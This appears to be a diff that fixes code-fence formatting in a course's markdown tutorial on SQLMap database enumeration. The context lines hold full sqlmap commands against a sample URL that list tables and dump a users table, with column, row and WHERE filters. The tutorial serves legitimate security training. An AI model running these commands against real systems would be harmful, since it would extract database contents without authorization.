@@ -10,8 +10,7 @@ Enumeration represents the central part of an SQL injection attack, which is don
 
 For such purpose, SQLMap has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content. For example, the excerpts from [queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) for a MySQL DBMS can be seen below:
 
-```
-        xml
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 
 <root>
@@ -56,8 +55,7 @@ Enumeration usually starts with the retrieval of the basic information:
 
 The following SQLMap command does all of the above:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
 
         ___
@@ -113,8 +111,7 @@ Note: The 'root' user in the database context in the vast majority of cases does
 
 In most common scenarios, after finding the current database name (i.e. `testdb`), the retrieval of table names would be by using the `--tables` option and specifying the DB name with `-D testdb`, is as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
 
 ...SNIP...
@@ -131,8 +128,7 @@ Database: testdb
 
 After spotting the table name of interest, retrieval of its content can be done by using the `--dump` option and specifying the table name with `-T users`, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
 
 ...SNIP...
@@ -164,8 +160,7 @@ Tip: Apart from default CSV, we can specify the output format with the option `-
 
 When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only `name` and `surname` columns) with the `-C` option, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
 
 ...SNIP...
@@ -185,8 +180,7 @@ Table: users
 
 To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the `--start` and `--stop` options (e.g., start from 2nd up to 3rd entry), as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
 
 ...SNIP...
@@ -208,8 +202,7 @@ Table: users
 
 If there is a requirement to retrieve certain rows based on a known `WHERE` condition (e.g. `name LIKE 'f%'`), we can use the option `--where`, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
 
 ...SNIP...
